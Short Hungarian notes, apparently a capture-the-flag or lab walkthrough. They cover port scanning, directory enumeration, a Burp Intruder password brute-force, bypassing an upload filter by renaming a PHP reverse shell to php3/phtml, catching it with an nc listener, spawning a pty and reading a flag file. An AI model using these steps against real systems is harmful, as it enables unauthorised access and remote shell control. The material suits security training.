1. sudo nmap -sS -sV -p- -T4 10.0.10.15

 célpont gép nyitott portjainak megtekintése, valszeg 80-as nyitott

3. dirb http://10.0.0.0:80/ /usr/share/wordlists/dirb/common.txt -r

 ezzel megtudod nézni az adott oldalon al oldalakat pl /login /search valszeg a /robots.txt ben lesz a jelszó 

5. jelszavakat bele teszed egy gini szöveges fileba

6. oldalon jobb klik inspect lesz egy felhasználónév kommentbe  valszeg itt: http://10.0.0.0:80/

7. terminálba: burpsuite böngészőbe foxy proxy bekapcsolása miközben megvan nyitva a burp

	burpsuitba intercept on 

8. oladlon megpróbálsz bejelentkezni, ezt elkapja a burp és jobb klikk -> send to intruder nyomsz egy cleart,(positions nél) passwordnél 
kijelölöd $jel közötti részt aztán add aztán átmész (payloads) load-olod a jelszó szoveges fileod start attack 
miután megvannak ezek nyomd ki a burp ot és foxy proxyt h ne kapjon el mindent

9. ezután a megadott jelszóval bejelntkezel


1. miután bejelnetkeztél uploadolod a gtihub repobol kimasolt source kód szoveges filet
, ha nem engedi akkor írd árt a kiterjesztést php3-ra vagy phtml-re

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

2. dirbuster

3. be recursive kikapcs file with list of ... /usr/share/wordlists/dirb/common.txt

4. nyitsz egy uj terminált aztán futtatod: nc -lvnp 4444

5. menj el az adott oldalra, ahol a reverse shell ed van van

6. lefuttatod azon a terminálon ahol a listener van
python3 -c "import pty;pty.spawn('/bin/bash')

www-data@10.10.10.0
whoami
cat flag.txt

https://10.0.0.123:1234/